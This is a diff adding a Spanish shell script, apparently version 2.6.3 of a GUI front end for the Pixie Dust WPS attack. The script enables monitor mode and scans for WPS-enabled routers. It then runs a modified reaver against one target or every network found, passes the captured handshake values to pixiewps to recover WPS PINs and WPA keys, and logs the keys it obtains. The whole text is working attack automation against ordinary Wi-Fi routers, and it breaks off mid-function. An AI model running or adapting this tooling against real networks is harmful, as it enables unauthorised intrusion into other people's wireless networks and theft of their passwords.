@@ -1,0 +1,2129 @@
+#!/bin/sh
+# Cambio en linea 211 ####
+# VERSION DEL SCRIPT
+VERSION="2.6.3"
+export VERSION
+
+RUTA_BASE=$(pwd)
+
+#LOG DEL SCRIPT
+LOG_SCRIPT="$RUTA_BASE/pixiescript.log"
+echo "" > "$LOG_SCRIPT"
+
+{
+#CARPETAS
+RUTA_HERRAMIENTAS="$RUTA_BASE/HERRAMIENTAS/"
+RUTA_ICONOS="$RUTA_BASE/ICONOS"
+RUTA_LOGS="$RUTA_BASE/LOGS"
+RUTA_CLAVES="$RUTA_BASE/CLAVES"
+RUTA_BRUTEFORCE="$RUTA_BASE/BRUTEFORCE"
+export RUTA_CLAVES
+export RUTA_LOGS
+export RUTA_BRUTEFORCE
+export RUTA_BASE
+
+#HERRAMIENTAS
+REAVER="$RUTA_HERRAMIENTAS./reaver_pixie"
+WASH="$RUTA_HERRAMIENTAS./wash"
+PIXIE="$RUTA_HERRAMIENTAS./pixiewps"
+XCLIP="$RUTA_HERRAMIENTAS./xclip"
+CPULIMIT="$RUTA_HERRAMIENTAS./cpulimit"
+export REAVER
+export WASH
+export PIXIE
+export XCLIP
+export CPULIMIT
+
+# ICONOS
+ICONO_SCRIPT="$RUTA_ICONOS/ICONO.png"
+ICONO_MENU="$RUTA_ICONOS/MENU.png"
+ICONO_CLAVES="$RUTA_ICONOS/CLAVES.png"
+ICONO_VER="$RUTA_ICONOS/VER.png"
+ICONO_EXPORTAR="$RUTA_ICONOS/EXPORT.png"
+ICONO_UPDATE="$RUTA_ICONOS/UPDATE.png"
+ICONO_DATABASE="$RUTA_ICONOS/DATABASE.png"
+ICONO_SOFT="$RUTA_ICONOS/SCRIPT.png"
+ICONO_MONITOR="$RUTA_ICONOS/MONITOR.png"
+ICONO_SCAN="$RUTA_ICONOS/SCAN.png"
+ICONO_STOP_SCAN="$RUTA_ICONOS/STOP_SCAN.png"
+ICONO_START_ATACK="$RUTA_ICONOS/ATACAR.png"
+ICONO_STOP_ATACK="$RUTA_ICONOS/STOP_ATACK.png"
+ICONO_MACHANGER="$RUTA_ICONOS/MACHANGER.png"
+ICONO_RANDOM="$RUTA_ICONOS/RANDOM.png"
+ICONO_MANUAL="$RUTA_ICONOS/MANUAL.png"
+ICONO_START_BRUTE="$RUTA_ICONOS/START_BRUTEFORCE.png"
+ICONO_STOP_BRUTE="$RUTA_ICONOS/STOP_BRUTEFORCE.png"
+ICONO_PAUSE_BRUTE="$RUTA_ICONOS/PAUSE_BRUTEFORCE.png"
+ICONO_RESUME_BRUTE="$RUTA_ICONOS/RESUME_BRUTEFORCE.png"
+ICONO_ELIMINAR_BRUTE="$RUTA_ICONOS/ELIMINAR_BRUTEFORCE.png"
+ICONO_APLICAR="$RUTA_ICONOS/APLICAR.png"
+ICONO_RECUPERAR_CLAVE_WPA="$RUTA_ICONOS/RECUPERAR_WPA.png"
+ICONO_RECUPERAR_CLAVE_WPA_VER="$RUTA_ICONOS/RECUPERAR_WPA_VER.png"
+ICONO_CONECTAR="$RUTA_ICONOS/CONECTAR.png"
+ICONO_ELIMINAR_VER="$RUTA_ICONOS/ELIMINAR_VER.png"
+export ICONO_SCRIPT
+export ICONO_SOFT
+
+# LOGS
+LOG_STATUSBAR="$RUTA_LOGS/STATUSBAR.LOG"
+LOG_REDES_ESCANEADAS="$RUTA_LOGS/ESCANEADAS.LOG"
+LOG_MODO_MONITOR="$RUTA_LOGS/MONITOR.LOG"
+LOG_ESTADO_ESCANEO="$RUTA_LOGS/SCANEO.LOG"
+LOG_VARIOS="$RUTA_LOGS/VARIOS.LOG"
+LOG_AIRODUMP="$RUTA_LOGS/AIRODUMP.LOG"
+LOG_ATAQUE="$RUTA_LOGS/REAVER.LOG"
+LOG_ESTADO_ATAQUE="$RUTA_LOGS/ESTADO_ATAQUE.LOG"
+LOG_PROCESOS="$RUTA_LOGS/PROCESOS.LOG"
+LOG_SESIONES_BRUTEFORCE="$RUTA_BRUTEFORCE/BRUTEFORCE.LOG"
+LOG_MAXIMAS_SESIONES_BRUTEFORCE="$RUTA_BRUTEFORCE/SESIONES_MAXIMAS.LOG"
+LOG_TIMER_BRUTEFORCE="$RUTA_BRUTEFORCE/TIMER.LOG"
+LOG_TIMER_VER="$RUTA_LOGS/TIMER.LOG"
+
+export LOG_SCRIPT
+export LOG_STATUSBAR
+export LOG_REDES_ESCANEADAS
+export LOG_MODO_MONITOR
+export LOG_ESTADO_ESCANEO
+export LOG_VARIOS
+export LOG_AIRODUMP
+export LOG_ATAQUE
+export LOG_ESTADO_ATAQUE
+export LOG_SESIONES_BRUTEFORCE
+export LOG_MAXIMAS_SESIONES_BRUTEFORCE
+export LOG_TIMER_BRUTEFORCE
+export LOG_TIMER_VER
+export LOG_PROCESOS
+
+# ARCHIVO CAP DEL AIRODUMP
+ARCHIVO_CAP="$RUTA_LOGS/CAPTURA"
+export ARCHIVO_CAP
+
+#SEMAFOROS
+SEMAFORO_DETENER_SCANEO="$RUTA_LOGS/DETENER_SCAN"
+SEMAFORO_DETENER_ATAQUE="$RUTA_LOGS/DETENER_ATAQUE"
+SEMAFORO_DETENER_TODO="$RUTA_LOGS/DETENER_TODO"
+export SEMAFORO_DETENER_SCANEO
+export SEMAFORO_DETENER_ATAQUE
+export SEMAFORO_DETENER_TODO
+
+#DATABASES
+DATABASE_REDES_ATACADAS="$RUTA_BASE/DATABASES/REDES_ATACADAS"
+DATABASE_REDES_VULNERABLES="$RUTA_BASE/DATABASES/REDES_VULNERABLES"
+DATABASE_CLAVES_CONSEGUIDAS="$RUTA_BASE/DATABASES/CLAVES_CONSEGUIDAS"
+export DATABASE_REDES_ATACADAS
+export DATABASE_REDES_VULNERABLES
+export DATABASE_CLAVES_CONSEGUIDAS
+
+# CREO CARPETA LOGS Y LOGS NECESARISO PARA EL INICIO
+sudo rm -rf $RUTA_LOGS
+mkdir $RUTA_LOGS
+touch $LOG_STATUSBAR
+echo "C" > $LOG_MODO_MONITOR
+echo "C" > $LOG_ESTADO_ESCANEO
+touch $LOG_REDES_ESCANEADAS
+touch $LOG_ATAQUE
+echo "C" > $LOG_ESTADO_ATAQUE
+touch $LOG_SESIONES_BRUTEFORCE
+
+ListarTarjetasWifi() {   
+	echo "***************** ListarTarjetasWifi" >> "$LOG_SCRIPT"
+	INTERFACES_MONITOR=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon)
+	let CUANTAS=$(echo $INTERFACES_MONITOR | wc -w)
+	let CONT=1
+	while [ $CONT -le $CUANTAS ]
+	do
+		MON=$(echo $INTERFACES_MONITOR | awk '{print $'$CONT'}')
+		sudo airmon-ng stop $MON 
+		let CONT=$CONT+1
+	done
+       
+	echo '<comboboxtext active="0" button-sensitivity="1">'
+	echo '<variable export="true">TARJETA_SELECCIONADA</variable>'
+    
+	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)
+	N_TARJETAS_WIFI=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}')
+	if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
+	then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: No se detectó ninguna tarjeta WiFi" --on-top --center --window-icon=$ICONO_SOFT
+		exit 1
+	else
+		let x=1
+		while [ $x -le $N_TARJETAS_WIFI ]
+		do
+			INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}')
+			DRIVER=$(ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/')
+			echo '<item>'$INTERFAZ' '$DRIVER'</item>'
+			x=$((x+1))
+		done
+	fi
+	echo "</comboboxtext>"
+	unset INTERFACES_MONITOR CONT CUANTAS MON TARJETAS_WIFI_DISPONIBLES N_TARJETAS_WIFI INTERFAZ DRIVER x
+}
+
+
+ActivarModoMonitor(){ 
+	echo "***************** ActivarModoMonitor"
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+	
+	if ! CheckInterface 
+	then 
+		echo "1" > "$LOG_MODO_MONITOR"
+		return
+	fi
+	echo "DESLIGANDO INTERFACE DE NETWORKMANAGER" > "$LOG_STATUSBAR"
+	if ! DeshabilitarNetworkManager ON 
+	then 
+		echo "1" > "$LOG_MODO_MONITOR"
+		return 
+	fi
+	echo "ACTIVANDO MODO MONITOR" > "$LOG_STATUSBAR"  
+	sudo airmon-ng start $TARJETA_SELECCIONADA &> "$LOG_VARIOS"
+	sleep 3
+	#ifconfig $TARJETA_SELECCIONADA up
+	TARJETA_MODO_MONITOR=$(iwconfig | grep Mode:Monitor | awk {'print $1'})
+	if [ ! $TARJETA_MODO_MONITOR ]
+	then 
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" --on-top --center --window-icon=$ICONO_SOFT
+		echo "1" > "$LOG_MODO_MONITOR"
+		echo "ERROR: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" > "$LOG_STATUSBAR"
+		return 1
+	else
+		echo "Modo monitor activado en $TARJETA_MODO_MONITOR" > "$LOG_STATUSBAR"
+		echo "0" > "$LOG_MODO_MONITOR"
+		echo $TARJETA_MODO_MONITOR >> "$LOG_MODO_MONITOR"
+	fi
+	unset TARJETA_MODO_MONITOR
+}
+
+
+CheckInterface() {
+	echo "***************** CheckInterface"
+	if [ "$(ip route|grep "$TARJETA_SELECCIONADA")" ]; then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" --on-top --center --window-icon=$ICONO_SOFT 
+		echo "ERROR: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" > "$LOG_STATUSBAR"
+		unset TARJETA_SELECCIONADA
+		return 1
+	fi
+}
+
+
+DeshabilitarNetworkManager() {
+	echo "***************** DeshabilitarNetworkManager"
+	#CFG_FILE="/etc/NetworkManager/NetworkManager.conf"
+	 CFG_FILE=""
+	
+	if [ -f "$CFG_FILE" ]; then
+		
+		if [ -f "/sys/class/net/$TARJETA_SELECCIONADA/address" ]; then
+			
+			TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+			
+		elif [ -f "/sys/class/net/${TARJETA_SELECCIONADA}mon/address" ]; then
+			
+			TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/${TARJETA_SELECCIONADA}mon/address")"
+		else
+			yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Ha ocurrido un error inesperado con la interface $TARJETA_SELECCIONADA" --on-top --center --window-icon=$ICONO_SOFT 
+			echo "ERROR: Ha ocurrido un error inesperado con la interface $TARJETA_SELECCIONADA" > "$LOG_STATUSBAR"
+			unset CFG_FILE TARJETA_SELECCIONADA TARJETA_SELECCIONADA_MAC
+			return 1
+		fi
+		
+		[ ! "$(grep "^\[keyfile\]" "$CFG_FILE")" ] && echo "[keyfile]" >>"$CFG_FILE"
+		[ ! "$(grep "^plugins=" "$CFG_FILE")" ] && echo "plugins=" >>"$CFG_FILE"
+		[ ! "$(cat "$CFG_FILE"|grep "^plugins="|grep "keyfile")" ] && \
+		sudo sed -i 's/^plugins=/plugins=keyfile,/' "$CFG_FILE"
+		
+		[ "$1" = "ON" ] && [ ! "$(cat "$CFG_FILE"|grep "unmanaged-devices=mac:$TARJETA_SELECCIONADA_MAC")" ] && sudo sed -i "s/^\[keyfile\]/\[keyfile\]\nunmanaged-devices=mac:$TARJETA_SELECCIONADA_MAC/" "$CFG_FILE"
+		[ "$1" = "OFF" ] && sudo sed -i "s/unmanaged-devices=mac:\([0-9A-Z]\{2\}:\)\{5\}[0-9A-Z]\{2\}//g"  "$CFG_FILE"
+		echo " "
+		sudo sed -i '/^$/d' "$CFG_FILE"
+	fi
+	unset CFG_FILE TARJETA_SELECCIONADA_MAC 
+}
+
+
+EscanearRedes() {
+	echo "***************** EscanearRedes"
+	sudo rm -f "$ARCHIVO_CAP"* 
+	sudo rm -f "$LOG_AIRODUMP" 
+	sudo rm "$LOG_REDES_ESCANEADAS"
+	touch "$LOG_REDES_ESCANEADAS"
+    
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+	TARJETA_MODO_MONITOR=$(head -2 "$LOG_MODO_MONITOR" | tail -1) 
+	TIEMPO_SCANEO=$1
+	if ! ValidarTiempos $TIEMPO_SCANEO; then echo "1" > $LOG_ESTADO_ESCANEO; return; fi 
+    
+	(sudo airodump-ng "$TARJETA_MODO_MONITOR" -a -w "$ARCHIVO_CAP" &> /dev/null &)
+    
+	for A in `seq 1 $TIEMPO_SCANEO` 
+	do
+		sleep 1s
+		if [ $A -eq $TIEMPO_SCANEO ]
+		then
+			echo "ESCANEO COMPLETADO, PROCESANDO DATOS" > "$LOG_STATUSBAR"
+			PID_AIRODUMP=$(ps -A | grep airodump-ng | awk '{ print $1}')
+			ATAQUE_ACABADO="NO"
+			sudo kill $PID_AIRODUMP
+			ProcesarDatosScaneo
+		else
+			if [ -f  "$SEMAFORO_DETENER_SCANEO" ]
+			then
+				echo "ESCANEO DETENIDO, PROCESANDO DATOS, ESPERA ..." > "$LOG_STATUSBAR"
+				rm "$SEMAFORO_DETENER_SCANEO"
+				PID_AIRODUMP=$(ps -A | grep airodump-ng | awk '{ print $1}')
+				sudo kill $PID_AIRODUMP
+				ATAQUE_ACABADO="NO"
+				ProcesarDatosScaneo
+				return
+			fi
+			if [ -f $SEMAFORO_DETENER_TODO ]
+			then
+				echo "DETENIENDO EL SCRIPT, ESPERA ... " > "$LOG_STATUSBAR"
+				Limpiar
+			fi
+			
+			TIEMPO_RESTANTE=$(expr $TIEMPO_SCANEO - $A)
+			echo "BUSCANDO REDES, ESPERA $TIEMPO_RESTANTE segundos" > "$LOG_STATUSBAR"
+		fi
+	done
+	unset TARJETA_MODO_MONITOR TIEMPO_SCANEO TIEMPO_RESTANTE PID_AIRODUMP A TIEMPO
+	unset ARCHIVO_TEMPORAL LINEAS_LOG A LINEA BSSID CANAL WPS_VERSION LOCKED ESSID control_espacio_blanco esp INTENSIDAD ESTADO mac_a_comprobar INICIO_MAC
+}
+
+
+ProcesarDatosScaneo() {
+	echo "***************** ProcesarDatosScaneo"
+	if [ $ATAQUE_ACABADO = "NO" ]
+	then
+		if [ ! -f "$ARCHIVO_CAP-01.cap" ] 
+		then 
+			yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Ha ocurrido un error escaneando redes" --on-top --center --window-icon=$ICONO_SOFT
+			echo "ERROR: Ha ocurrido un error escaneando redes" > "$LOG_STATUSBAR"
+			echo "1" > "$LOG_ESTADO_ESCANEO"
+			return
+		fi
+		sudo "$WASH" -C -f "$ARCHIVO_CAP-01.cap" | tail -n +3 > "$LOG_VARIOS"
+	fi
+	sed '/^$/d' "$LOG_VARIOS" > "$LOG_AIRODUMP"
+	LINEAS_LOG=$(cat "$LOG_AIRODUMP" | wc -l | awk {' print$1 '})
+    
+	if [ $LINEAS_LOG -eq 0 ] 
+	then 
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: No se han detectado redes con WPS activo" --on-top --center --window-icon=$ICONO_SOFT 
+		echo "ERROR: No se han detectado redes con WPS activo" > "$LOG_STATUSBAR"
+		echo "1" > "$LOG_ESTADO_ESCANEO"
+		return
+	fi
+	
+	rm $LOG_REDES_ESCANEADAS
+	touch $LOG_REDES_ESCANEADAS
+	
+	for A in `seq 1 $LINEAS_LOG` ; do 
+		LINEA=$(head -$A "$LOG_AIRODUMP" | tail -1)
+    		
+		BSSID=$(echo $LINEA | awk {'print $1'})
+		CANAL=$(echo $LINEA | awk {'print $2'})
+		WPS_VERSION=$(echo $LINEA | awk {'print $4'})
+		LOCKED=$(echo $LINEA | awk {'print $5'})
+		ESSID=$(echo $LINEA | awk {'print $6'})
+	
+		let esp=8
+		control_espacio_blanco=$(head -$A "$LOG_AIRODUMP" | tail -1 | awk '{ print $7 }')
+		while [ $control_espacio_blanco ]
+		do
+			ESSID=$(echo $ESSID" "$control_espacio_blanco)
+			control_espacio_blanco=$(head -$A "$LOG_AIRODUMP" | tail -1 | awk -v i=$esp '{ print $i }')
+			let esp=$esp+1
+		done
+		INTENSIDAD="$(cat "$ARCHIVO_CAP-01.csv"|grep -am1 "$BSSID"|awk -F ',' '{print $9}'|tr -d ' ')" #| sed 's/,\|-//g')"
+		if [ -z $INTENSIDAD ]; then INTENSIDAD="-99";fi
+	
+		INTENSIDAD=$(expr $INTENSIDAD + 110)
+	
+		ESTADO="gtk-dialog-question"
+		
+		if grep -q $BSSID "$DATABASE_REDES_ATACADAS" 
+		then
+			ESTADO=$(grep $BSSID "$DATABASE_REDES_ATACADAS" | awk {' print $2 '})
+			case $ESTADO in
+				"NV") ESTADO="gtk-dialog-error" ;;
+				"PC") ESTADO="gtk-about" ;;
+				"SD") ESTADO="gtk-dialog-warning" ;;
+				"BF") ESTADO="gtk-execute";;
+			esac
+		fi
+		INICIO_MAC=$(echo ${BSSID:0:8})
+		if grep -q $INICIO_MAC "$DATABASE_REDES_VULNERABLES"
+		then
+			if [ $ESTADO != "gtk-about" ] ; then ESTADO="gtk-apply" ; fi
+		fi
+			
+		if [ $A = $LINEAS_LOG ]
+		then
+			echo -n $ESTADO"|"$A"|"$BSSID"|"$CANAL"|"$INTENSIDAD"|"$WPS_VERSION"|"$LOCKED"|"$ESSID"" >> "$LOG_REDES_ESCANEADAS"
+		else
+			echo $ESTADO"|"$A"|"$BSSID"|"$CANAL"|"$INTENSIDAD"|"$WPS_VERSION"|"$LOCKED"|"$ESSID"" >> "$LOG_REDES_ESCANEADAS"
+		fi
+	done
+	
+	if [ $ATAQUE_ACABADO = "NO" ]
+	then 
+		echo "DATOS PROCESADOS CON EXITO, ESCANEO FINALIZADO" > "$LOG_STATUSBAR"
+		echo "0" > "$LOG_ESTADO_ESCANEO"
+	fi
+}
+
+
+TipoAtaque(){
+	echo "***************** TipoAtaque"
+	MODO_ATAQUE=$1
+	if ! ValidarTiempos $TIEMPO_ATAQUE; then echo "FIN" > $LOG_ESTADO_ATAQUE; return; fi
+	COPIA_TIEMPO_ATAQUE=$TIEMPO_ATAQUE
+	case $MODO_ATAQUE in
+	      "1") AUTOMATICO="NO" ; ACTUALIZAR_SCAN="SI"; LINEA_ATAQUE=$2; ExtraerDatosAp ;;
+	      "2") AUTOMATICO="SI" ; ACTUALIZAR_SCAN="SI"; AtacarTodos ;;
+	      "3") AUTOMATICO="NO" ; ACTUALIZAR_SCAN="NO"; IntroducirDatosAp ;;
+	esac
+	echo "FIN" > $LOG_ESTADO_ATAQUE
+	# TipoAtaque
+	unset MODO_ATAQUE LINEA_ATAQUE AUTOMATICO ACTUALIZAR_SCAN
+	# ExtraerDatosAp
+	unset LINEA_ATAQUE BSSID CANAL ESSID CLAVE_CONSEGUIDA seguir ret VEZ ATAQUE_ACABADO
+	# AtacarAP
+	unset TARJETA_SELECCIONADA TARJETA_MODO_MONITOR MENSAJE_ERROR PKe PKr EHash1 EHash2 AuthKey Enrollee
+	# EsperarAcabarReaver
+	unset A PID_REAVER TIEMPO_RESTANTE
+	# ExtraerDatosReaver
+	unset fabricante modelo numero_de_modelo numero_de_serie device_name
+	# AgregarBssidDatabases
+	unset CASO CASO_VIEJO 
+	# AnalizarLogPixiewps
+	unset PIN_WPS CLAVE_WPA Archivo_Datos
+	# AtacarTodos
+	unset TOTAL_LINEAS MA
+	# IntroducirDatosAp
+	unset DATOS
+	# ValidarMac
+	unset MAC_A_VALIDAR i caracter
+	# ValidarTiempos
+	unset TIEMPO
+	# ProcesarDatosScaneo
+	unset ARCHIVO_TEMPORAL LINEAS_LOG A LINEA WPS_VERSION LOCKED ESSID control_espacio_blanco esp INTENSIDAD ESTADO mac_a_comprobar INICIO_MAC
+}
+
+
+IntroducirDatosAp(){
+	echo "***************** IntroducirDatosAp"
+	DATOS=$(yad --width=400 --title="ATAQUE MANUAL" --text="<b>Introduce los datos solicitados</b>" --on-top --center --window-icon=$ICONO_SOFT \
+	--form \
+	--image=$ICONO_SCRIPT \
+	--field="BSSID" \
+	--field="CANAL:CBE" \
+	"" '1!2!3!4!5!6!7!8!9!10!11!12!13')
+
+	BSSID=$(echo $DATOS | awk -F "|" {'print $1'})
+	BSSID=$(echo $BSSID | awk '{print toupper($0)}')
+	CANAL=$(echo $DATOS | awk -F "|" {'print $2'})
+
+	if [ -z $BSSID ]; then return; fi
+
+	if  ! ValidarMac $BSSID
+	then 
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --on-top --center --window-icon=$ICONO_SOFT 
+		return
+	fi
+	VEZ="WPS"
+	AtacarAP
+}
+
+
+AtacarTodos() {
+	echo "***************** AtacarTodos"
+	TOTAL_LINEAS=$(cat $LOG_REDES_ESCANEADAS | wc -l | awk {' print$1 '})
+	let TOTAL_LINEAS=$TOTAL_LINEAS+1
+  
+	for MA in `seq 1 $TOTAL_LINEAS` 
+	do
+		if [ -f $SEMAFORO_DETENER_ATAQUE ]; then return; fi
+		LINEA_ATAQUE=$MA
+		if [ -f $SEMAFORO_DETENER_TODO ]
+		then 
+			return 
+		else 
+			ExtraerDatosAp
+		fi
+	done
+	echo "ATAQUE AUTOMATICO ACABADO" > $LOG_STATUSBAR
+}
+
+
+ExtraerDatosAp() {
+	echo "***************** ExtraerDatosAp"
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$LOG_REDES_ESCANEADAS" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $8 '})
+	CLAVE_CONSEGUIDA=$(echo $LINEA_ATAQUE | awk -F "|" {' print $1 '})
+	LOCKED=$(echo $LINEA_ATAQUE | awk -F"|" '{print $7}')
+	
+	if [ $LOCKED = "Yes" ]
+	then
+		echo "$BSSID LOCKED, no se atacará" > "$LOG_STATUSBAR"
+		return
+	fi
+		
+	if [ $CLAVE_CONSEGUIDA = "gtk-about" ]     
+	then
+		if [ $AUTOMATICO = "NO" ]
+		then
+			seguir=$(yad --image "dialog-question" --title "PIN YA CONSEGUIDO" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>PIN YA CONSEGUIDO</b>: Ya se tiene este PIN almacenado. ¿ Quieres volver a atacar $BSSID ? " --width=450 --on-top --center --window-icon=$ICONO_SOFT)
+			ret=$?
+			if [ $ret = "1" ]
+			then
+				VEZ="WPS"
+				AtacarAP 
+				ATAQUE_ACABADO="SI"
+			fi
+		fi
+	else
+		VEZ="WPS"
+		AtacarAP
+		ATAQUE_ACABADO="SI"
+	fi 
+}
+
+
+AtacarAP(){
+	echo "***************** AtacarAP"
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+	TARJETA_MODO_MONITOR=$(head -2 "$LOG_MODO_MONITOR" | tail -1) 
+
+	echo "ATACANDO BSSID $BSSID EN CANAL $CANAL" > "$LOG_STATUSBAR"
+	sudo "$REAVER" -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D -N > "$LOG_ATAQUE"
+	if [ $VEZ="WPS" ]; then TIEMPO_ATAQUE=$COPIA_TIEMPO_ATAQUE; fi 
+	if ! EsperarAcabarReaver
+	then
+		if [ $AUTOMATICO = "NO" ]
+		then
+			if [ $VEZ = "WPS" ]
+			then
+				yad --image "error" --title "ATAQUE FALLIDO" --button=gtk-ok:0 --text "<b>ERROR</b>: NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID, ATAQUE REAVER FALLIDO" --width=450 --on-top --center --window-icon=$ICONO_SOFT
+			else
+				yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: NO SE HAN PODIDO RECUPERAR LA CLAVE WPA DE $BSSID" --width=450 --on-top --center --window-icon=$ICONO_SOFT
+			fi
+		fi
+    
+		if [ $VEZ = "WPS" ]
+		then 
+			#NO HA CONSEGUIDO LOS DATOS PARA LANZAR PIXIEWPS
+			AgregarBssidDatabases 1
+			ATAQUE_ACABADO="SI"
+			if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+			return 1 
+		fi
+	fi
+	if [ -f "$SEMAFORO_DETENER_ATAQUE" ]; then sudo rm "$SEMAFORO_DETENER_ATAQUE"; return; fi
+		
+	if ! ExtraerDatosReaver 
+	then
+		    if [ $AUTOMATICO = 0 ]; then yad --image "error" --title "ATAQUE FALLIDO" --button=gtk-ok:0 --text "<b>ERROR</b>: $MENSAJE_ERROR DE $BSSID" --on-top --center --window-icon=$ICONO_SOFT ; fi
+		    echo "$MENSAJE_ERROR DE $BSSID" > "$LOG_STATUSBAR"
+		    AgregarBssidDatabases 1
+		    ATAQUE_ACABADO="SI"
+		    if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+		    return
+	fi
+	
+	echo "PROBANDO CON PIXIEWPS 1.1 by wiire" > "$LOG_STATUSBAR"
+	
+	nombre_archivo=$(echo ${BSSID//:/})
+	
+	"$PIXIE" -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee -v 3 -o $nombre_archivo &>> "$LOG_ATAQUE"
+	if [ ! -f $SEMAFORO_DETENER_TODO ]; then AnalizarLogPixiewps; fi
+}
+
+
+EsperarAcabarReaver() {
+	echo "***************** EsperarAcabarReaver"
+	for A in `seq 1 $TIEMPO_ATAQUE`
+	do
+		sleep 1s
+		PID_REAVER=$(ps -A | grep reaver_pixie | awk '{ print $1 }')
+  
+		if [ -n "$PID_REAVER" ]
+		then
+			if [ $A -eq $TIEMPO_ATAQUE ]
+			then
+				if [ $VEZ = "WPS" ] 
+				then
+					echo "NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID, ATAQUE REAVER FALLIDO" > "$LOG_STATUSBAR"
+				else
+					echo -e "NO SE HAN PODIDO RECUPERAR LA CLAVE WPA DE $BSSID" > "$LOG_STATUSBAR" 
+				fi
+				MatarReaver
+				return 1
+			else
+				if [ -f  "$SEMAFORO_DETENER_ATAQUE" ]
+				then
+					echo "ATAQUE DETENIDO ..." > "$LOG_STATUSBAR"
+					PID_REAVER=$(ps -A | grep reaver_pixie | awk '{ print $1}')
+					MatarReaver
+					return
+				fi
+				if [ -f $SEMAFORO_DETENER_TODO ]
+				then
+					echo "DETENIENDO EL SCRIPT, ESPERA ... " > "$LOG_STATUSBAR"
+					Limpiar
+				fi
+				TIEMPO_RESTANTE=$(expr $TIEMPO_ATAQUE - $A)
+				if [ $VEZ = "WPS" ]; then echo "REAVER TRABAJANDO CON BSSID $BSSID, ESSID $ESSID, ESPERA $TIEMPO_RESTANTE s ..." > "$LOG_STATUSBAR"; fi
+			fi
+		else
+			return 0
+		fi
+	done
+}
+
+
+MatarReaver() {
+	echo "***************** MatarReaver"
+	sudo kill $PID_REAVER 
+}
+
+
+ExtraerDatosReaver() {
+	echo "***************** ExtraerDatosReaver"
+	echo "$BSSID : EXTRAYENDO DATOS ATAQUE REAVER ..." > "$LOG_STATUSBAR"
+	PKe=$(grep --binary-files=text "PKe:" "$LOG_ATAQUE" | awk '{print $2}')
+	PKr=$(grep --binary-files=text "PKr:" "$LOG_ATAQUE" | awk '{print $2}')
+	EHash1=$(grep --binary-files=text "E-Hash1:" "$LOG_ATAQUE" | awk '{print $2}')
+	EHash2=$(grep --binary-files=text "E-Hash2:" "$LOG_ATAQUE" | awk '{print $2}')
+	AuthKey=$(grep --binary-files=text "AuthKey:" "$LOG_ATAQUE" | awk '{print $2}')
+	Enrollee=$(grep --binary-files=text "E-Nonce:" "$LOG_ATAQUE" | awk '{print $2}')
+	ESSID=$(grep --binary-files=text "ESSID" "$LOG_ATAQUE" |  awk {' print $6 '} | sed 's/)/ /g')
+	ESSID=$(echo $ESSID)
+	fabricante=$(grep -m 1 --binary-files=text "Fabricante" "$LOG_ATAQUE")
+	modelo=$(grep -m 1 --binary-files=text "Modelo" "$LOG_ATAQUE")
+	numero_de_modelo=$(grep -m 1 --binary-files=text "modelo" "$LOG_ATAQUE")
+	numero_de_serie=$(grep -m 1 --binary-files=text "serie" "$LOG_ATAQUE")
+	device_name=$(grep -m 1 --binary-files=text "Device" "$LOG_ATAQUE")
+	
+	if [ -z $PKr ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE PKR"; return 1; fi
+	if [ -z $PKe ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE PKE"; return 1; fi
+	if [ -z $EHash1 ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE EHASH1"; return 1; fi
+	if [ -z $EHash2 ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE EHASH2"; return 1; fi
+	if [ -z $AuthKey ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE AUTHKEY"; return 1; fi
+	if [ -z $Enrollee ]; then MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE Enrollee Nonce"; return 1; fi
+	
+	return 0
+}
+
+
+AgregarBssidDatabases(){
+	echo "***************** AgregarBssidDatabases"
+	# 1 No funciona Reaver (SD)
+	# 2 No funciona Pixie (NV)
